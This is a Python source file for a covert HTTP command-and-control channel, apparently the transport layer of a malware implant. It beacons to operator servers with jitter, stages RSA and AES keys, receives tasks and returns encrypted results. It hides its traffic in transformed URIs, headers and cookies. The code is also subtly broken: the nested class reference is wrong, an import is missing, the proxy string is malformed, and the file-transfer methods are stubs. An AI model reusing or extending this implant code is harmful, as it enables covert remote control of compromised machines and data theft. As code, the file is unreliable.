import os
import json
import random
import base64
import logging
from typing import Dict, List, Optional
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
import requests

logger = logging.getLogger("DynamicHTTPC2")

class DynamicHTTPC2:
    def __init__(self, config: Dict):
        self.config = config
        self.interval = config['interval']
        self.jitter = config['jitter']
        self.chunk_size = config['chunk_size']
        self.aes_key = base64.b64decode(config.get('aes_psk', '')) if config.get('aes_psk') else None
        self.key_exchange = config.get('key_exchange', False)
        self.rsa_privkey = None
        self.session = requests.Session()
        self.session.proxies = self._parse_proxy(config)
        self.transforms = MessageTransformer()

    class MessageTransformer:
        @staticmethod
        def transform(value: str, transforms: List[Dict]) -> str:
            for t in transforms:
                func = t['function']
                params = t.get('parameters', [])
                if func == "prepend":
                    value = params + value
                elif func == "append":
                    value += params
                elif func == "base64":
                    value = base64.b64encode(value.encode()).decode()
                elif func == "random_mixed":
                    value += ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=int(params[0])))
            return value

        @staticmethod
        def reverse_transform(value: str, transforms: List[Dict]) -> str:
            for t in reversed(transforms):
                func = t['function']
                params = t.get('parameters', [])
                if func == "prepend":
                    value = value[len(params):]
                elif func == "append":
                    value = value[:-len(params)]
                elif func == "base64":
                    value = base64.b64decode(value).decode()
                elif func == "random_mixed":
                    value = value[:-int(params[0])]
            return value

    def _parse_proxy(self, config: Dict) -> Dict:
        proxy = {}
        if config.get('proxy_host'):
            proxy['http'] = f"http://{config['proxy_host']}:{config['proxy_port']}"
            if config.get('proxy_user'):
                proxy['http'] = f"{config['proxy_user']}:{config['proxy_pass']}@{proxy['http']}"
        return proxy

    def encrypt_message(self, data: str) -> str:
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded_data = data.encode() + bytes([16 - (len(data) % 16)] * (16 - (len(data) % 16)))
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()

        h = hmac.HMAC(self.aes_key, hashes.SHA256(), backend=default_backend())
        h.update(iv + ciphertext)
        mac = h.finalize()

        return base64.b64encode(iv + ciphertext + mac).decode()

    def decrypt_message(self, encrypted: str) -> str:
        data = base64.b64decode(encrypted)
        iv = data[:16]
        ciphertext = data[16:-32]
        mac = data[-32:]

        h = hmac.HMAC(self.aes_key, hashes.SHA256(), backend=default_backend())
        h.update(iv + ciphertext)
        h.verify(mac)

        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded = decryptor.update(ciphertext) + decryptor.finalize()
        return padded[:-padded[-1]].decode()

    def _generate_rsa_keypair(self):
        self.rsa_privkey = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )

    def negotiate_key_exchange(self):
        self._generate_rsa_keypair()
        public_key = self.rsa_privkey.public_key().public_bytes(
            Encoding.DER,
            PublicFormat.SubjectPublicKeyInfo
        )
        
        session_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=20))
        payload = {
            'session_id': session_id,
            'pub_key': base64.b64encode(public_key).decode(),
            'action': 'staging_rsa'
        }
        
        response = self._send_request("POST", payload, encrypt=False)
        encrypted_key = base64.b64decode(response['session_key'])
        
        decrypted_key = self.rsa_privkey.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA1()),
                algorithm=hashes.SHA1(),
                label=None
            )
        )
        
        self.aes_key = decrypted_key
        return response['uuid']

    def _build_request(self, endpoint: Dict, data: str) -> requests.Request:
        url = random.choice(endpoint['urls'])
        transformed_uri = self.transforms.transform(endpoint['uri'], endpoint.get('uri_transforms', []))
        
        # Process query parameters
        query_params = {}
        for param in endpoint.get('query_params', []):
            value = self.transforms.transform(data if param['value'] == 'message' else param['value'], 
                                            param.get('transforms', []))
            query_params[param['name']] = value
        
        # Process headers
        headers = {}
        for header in endpoint.get('headers', []):
            value = self.transforms.transform(data if header['value'] == 'message' else header['value'], 
                                            header.get('transforms', []))
            headers[header['name']] = value
        
        # Process cookies
        cookies = {}
        for cookie in endpoint.get('cookies', []):
            value = self.transforms.transform(data if cookie['value'] == 'message' else cookie['value'], 
                                            cookie.get('transforms', []))
            cookies[cookie['name']] = value
        
        # Process body
        body = self.transforms.transform(data, endpoint.get('body_transforms', []))
        
        return requests.Request(
            method=endpoint['method'],
            url=f"{url}{transformed_uri}",
            params=query_params,
            headers=headers,
            cookies=cookies,
            data=body
        )

    def _send_request(self, method: str, data: Dict, encrypt: bool = True) -> Dict:
        endpoints = self.config['post_endpoints'] if method == "POST" else self.config['get_endpoints']
        endpoint = random.choice(endpoints)
        
        req = self._build_request(endpoint, json.dumps(data))
        prepped = self.session.prepare_request(req)
        
        try:
            response = self.session.send(prepped, timeout=15)
            response.raise_for_status()
            
            if encrypt and self.aes_key:
                return json.loads(self.decrypt_message(response.text))
            return response.json()
        except Exception as e:
            logger.error(f"Request failed: {str(e)}")
            time.sleep(self.gen_sleep_time())
            return {}

    def gen_sleep_time(self) -> float:
        jitter = self.interval * self.jitter * random.uniform(-1, 1)
        return self.interval + jitter

    def checkin(self, agent_info: Dict) -> bool:
        if self.key_exchange and not self.aes_key:
            agent_info['uuid'] = self.negotiate_key_exchange()
        
        encrypted_data = self.encrypt_message(json.dumps(agent_info))
        response = self._send_request("POST", {'data': encrypted_data})
        return response.get('status') == 'success'

    def get_tasking(self) -> List[Dict]:
        return self._send_request("GET", {'action': 'get_tasking'}).get('tasks', [])

    def post_response(self, task_id: str, output: Dict) -> bool:
        payload = {
            'task_id': task_id,
            'output': self.encrypt_message(json.dumps(output))
        }
        return self._send_request("POST", payload).get('status') == 'success'

    def download_file(self, task_id: str, file_path: str) -> Dict:
        # Implementation similar to previous but using chunk_size from config
        pass

    def upload_file(self, task_id: str, file_id: str) -> bytes:
        # Implementation similar to previous
        pass